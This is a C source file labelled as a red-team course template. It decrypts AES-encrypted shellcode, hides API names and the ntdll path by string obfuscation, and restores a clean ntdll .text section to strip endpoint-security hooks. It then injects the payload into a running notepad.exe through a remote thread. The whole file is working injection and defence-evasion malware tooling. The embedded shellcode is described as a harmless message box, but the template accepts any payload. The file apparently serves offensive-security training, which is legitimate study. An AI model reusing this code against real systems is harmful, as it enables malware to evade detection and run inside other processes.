/*

 Red Team Operator course code template
 classic code injection + with unhooks

 author: reenz0h (twitter: @SEKTOR7net)
 credits: NtRaiseHardError

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };

unsigned int payload_len = sizeof(payload);

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


void XORcrypt(char str2xor[], size_t len, char key) {
	/*
			XORcrypt() is a simple XOR encoding/decoding function
	*/
	int i;

	for (i = 0; i < len; i++) {
		str2xor[i] = (BYTE)str2xor[i] ^ key;
	}
}



int FindTarget(const wchar_t* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


// classic injection
int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	// Decrypt payload
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	/*
		UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
	*/
	// create a pointer to the NTHeaders of the unhooked NTDLL.dll binary.
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);
	int i;
	// string obfuscation of VirtualProtect0x0 using a character array rather than char *.
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	// create pointer to the virtualProtect function for use w/o adding the function to our import address table.
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
			((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		//compare the section name with ".text" if passes continue.
		if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			// open the hooked NTDLL.dll memory location + the virtual address of the unhooked .text section and change the entire .text region to execute_readwrite mem permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);

			//simply checks if oldProtect has a value, should be execute_read.
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}
			// copy fresh .text section into ntdll memory
			// use mem copy to copy entire .text section over the unhooked NTDLL.dll over the hooked version of the NTDLL.dll
			memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				(LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of ntdll memory
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}




int main(void) {

	int pid = 0;
	HANDLE hProc = NULL;

	//unsigned char sNtdllPath[] = "c:\\windows\\system32\\";
	unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };

	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

	unsigned int sNtdllPath_len = sizeof(sNtdllPath);
	unsigned int sNtdll_len = sizeof(sNtdll);
	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;

	// get function pointers
	// used to import functions for use without adding them to the import table directory.
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);

	// open ntdll.dll
	// opens a fresh copy of the NTDLL.dll binary.
	// starts by xor decrypting the NTDLL.dll file path
	XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	// opens a handle to the unhooked version of the NTDLL.dll binary.
	hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		// failed to open ntdll.dll
		return -1;
	}

	// prepare file mapping
	// then we create a file mapping for our fresh NTDLL.dll copy.
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		// file mapping failed
		CloseHandle(hFile);
		return -1;
	}

	// map the bastard
	// then we map the file into our process memory!
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
		// mapping failed
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		return -1;
	}

	printf("Check 1!\n"); getchar();

	// remove hooks
	// then we call our unhooking function, by passing as parameters the location of the hooking NTDLL.dll memory location and our mapped unhooked version.
	ret = UnhookNtdll(GetModuleHandleA((LPCSTR)sNtdll), pMapping);

	printf("Check 2!\n"); getchar();

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);

	pid = FindTarget(L"notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)pid);

		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
